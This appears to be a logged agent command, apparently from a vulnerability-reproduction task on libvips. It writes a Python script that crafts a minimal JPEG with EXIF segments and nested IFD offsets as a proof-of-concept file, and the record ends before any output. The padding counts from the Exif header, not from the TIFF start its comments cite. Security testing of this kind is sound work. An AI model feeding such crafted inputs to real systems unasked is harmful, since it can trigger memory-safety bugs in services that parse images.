Command `cd /workspace/repo-vul/src-vul/libvips && python3 - <<'PY'
from pathlib import Path
p=Path('poc1.bin')
# minimal JPEG with EXIF APP1 and crafted nested offsets
b=bytearray()
b += bytes.fromhex('FFD8')
# APP1 marker placeholder
exif = bytearray()
exif += b'Exif\x00\x00'
exif += b'II'  # little endian
exif += (42).to_bytes(2,'little')
exif += (8).to_bytes(4,'little')
# IFD0 at offset 8 from TIFF start (after Exif header)
# one entry
exif += (1).to_bytes(2,'little')
# entry: ExifIFDPointer tag 0x8769, type LONG=4, count=1, value offset 0x0000001A
exif += (0x8769).to_bytes(2,'little')
exif += (4).to_bytes(2,'little')
exif += (1).to_bytes(4,'little')
exif += (0x1A).to_bytes(4,'little')
# next IFD offset = 0
exif += (0).to_bytes(4,'little')
# EXIF IFD at offset 0x1A from TIFF start
while len(exif) < 0x1A:
    exif += b'\x00'
exif += (1).to_bytes(2,'little')
# MakerNote tag 0x927C, type UNDEFINED=7, count=8, value offset 0x30
exif += (0x927C).to_bytes(2,'little')
exif += (7).to_bytes(2,'little')
exif += (8).to_bytes(4,'little')
exif += (0x30).to_bytes(4,'little')
exif += (0).to_bytes(4,'little')
while len(exif) < 0x30:
    exif += b'\x00'
exif += b'ABCDEFGH'
app1 = b'\xFF\xE1' + (len(exif)+2).to_bytes(2,'big') + exif
b += app1
b += bytes.fromhex('FFD9')
p.write_bytes(b)
print(len(b))
